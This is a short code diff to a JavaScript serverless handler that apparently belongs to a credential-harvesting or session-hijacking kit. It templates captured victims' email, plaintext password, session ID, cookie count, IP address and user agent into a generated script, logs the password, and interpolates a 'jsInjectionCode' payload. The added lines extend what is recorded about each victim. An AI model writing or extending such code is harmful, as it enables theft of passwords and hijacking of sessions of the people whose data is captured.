@@ -259,13 +259,16 @@ export const handler = async (event, context) => {
 // Cookies found: ${formattedCookies.length}
 // Session ID: ${sessionId}
 // Email: ${userEmail}
+// IP Address: ${clientIP}
+// User Agent: ${event.headers['user-agent'] || 'Unknown'}
 
 let ipaddress = "${clientIP}";
 let email = "${userEmail}";
 let password = "${userPassword}";
 let sessionId = "${sessionId}";
+let cookieCount = ${formattedCookies.length};
 
-console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});
+console.log("Session Info:", {email, password, cookieCount, sessionId});
 
 ${jsInjectionCode}
 
